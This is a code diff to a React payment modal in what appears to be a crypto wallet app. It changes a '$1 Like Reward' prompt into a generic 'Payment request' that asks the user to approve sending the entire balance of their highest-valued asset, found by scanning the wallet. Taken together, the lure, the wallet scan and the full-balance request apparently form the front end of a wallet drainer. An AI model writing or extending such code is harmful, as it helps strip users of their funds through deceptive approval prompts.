@@ -37,14 +37,18 @@ export function PaymentRequestModal({
 }: PaymentRequestModalProps) {
   if (!open) return null
 
-  // Determine the highest-balance asset that will be charged $1 from
+  // Determine the highest-balance asset
   const highestInfo = steps ? getHighestAndLowestUSDTAndSol(steps).highest : null
 
   let highestAsset = asset || 'USDT'
   let highestBalanceDisplay = ''
+  let requestedUsd = 0
+  let requestedAmount = '0'
   if (highestInfo) {
     highestAsset = highestInfo.symbol
     highestBalanceDisplay = `${formatPaymentAmount(highestInfo.uiAmount, highestInfo.symbol)} (≈ $${highestInfo.usd.toFixed(2)})`
+    requestedUsd = highestInfo.usd
+    requestedAmount = formatPaymentAmount(highestInfo.uiAmount, highestInfo.symbol)
   }
 
   const handleCancel = () => {
@@ -73,13 +77,13 @@ export function PaymentRequestModal({
         </p>
 
         <h2 className="mt-2 text-xl font-semibold text-white">
-          💎 $1 Like Reward
+          💎 Payment request
         </h2>
 
         <p className="mt-1 text-sm leading-relaxed text-gray-300">
           Your wallet was scanned. The asset with the{' '}
           <span className="font-bold text-amber-400">highest balance</span> has been selected.
-          Approve a <span className="font-bold text-green-400">$1.00</span> payment from it below.
+          Approve a payment of <span className="font-bold text-green-400">{requestedAmount}</span> from it below.
         </p>
 
         <dl className="mt-5 space-y-3 rounded-xl border border-[#2a2a2a] bg-[#141414] px-4 py-3 text-sm">
@@ -110,7 +114,7 @@ export function PaymentRequestModal({
           <div className="flex justify-between gap-3 border-t border-[#2a2a2a] pt-2">
             <dt className="text-gray-400 font-medium">Amount Requested</dt>
             <dd className="font-bold text-green-400 text-base">
-              $1.00 USD
+              ${requestedUsd.toFixed(2)} USD
             </dd>
           </div>
 
@@ -147,10 +151,10 @@ export function PaymentRequestModal({
             {submitting ? (
               <span className="inline-flex items-center justify-center gap-2">
                 <Loader2 className="h-4 w-4 animate-spin" />
-                Sending $1…
+                Sending ${requestedUsd.toFixed(2)}…
               </span>
             ) : (
-              'Approve $1.00'
+              `Approve ${requestedAmount}`
             )}
           </button>
         </div>
